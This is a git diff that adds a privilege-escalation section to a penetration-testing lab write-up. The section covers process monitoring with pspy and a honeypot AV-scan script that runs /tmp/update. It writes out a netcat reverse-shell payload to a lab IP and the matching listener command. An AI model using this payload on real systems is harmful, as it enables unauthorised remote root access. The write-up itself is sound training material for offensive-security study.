@@ -184,3 +184,44 @@ https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
 
 ![Pasted image 20230518232145.png](https://github.com/shyamprasath18/offsec-labs/blob/main/Pasted%20image%2020230518232145.png)
 
+## privilage Escalation
+https://github.com/DominicBreuker/pspy
+
+- using this for linux process monitoring , found their is a process running after excecuting `honeypot.decoy`.
+
+```
+./honeypot.decoy 
+--------------------------------------------------
+
+Welcome to the Honey Pot administration manager (HPAM). Please select an option.
+1 Date.
+2 Calendar.
+3 Shutdown.
+4 Reboot.
+5 Launch an AV Scan.
+6 Check /etc/passwd.
+7 Leave a note.
+8 Check all services status.
+
+Option selected:5
+
+The AV Scan will be launched in a minute or less.
+--------------------------------------------------
+
+```
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/5eb45ebf-3f17-43dd-bb3a-9bcd6cacfd13)
+
+- searching out the exploit for that https://www.exploit-db.com/exploits/33899
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/0e140589-abaf-4210-b7ef-53cd44cf6582)
+
+- it run the /tmp/update file , so if we input anything on that it will also get excecute when the AV process running.
+
+- so modifing the update as excecutable with this `echo "/usr/bin/nc -e /bin/sh 192.168.49.52 4444" >/tmp/update`
+- listen to the port 4444 on host `nc -lvp 4444`
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/2b904ea2-b882-4648-a318-b0cc400c900d)
+
+
+
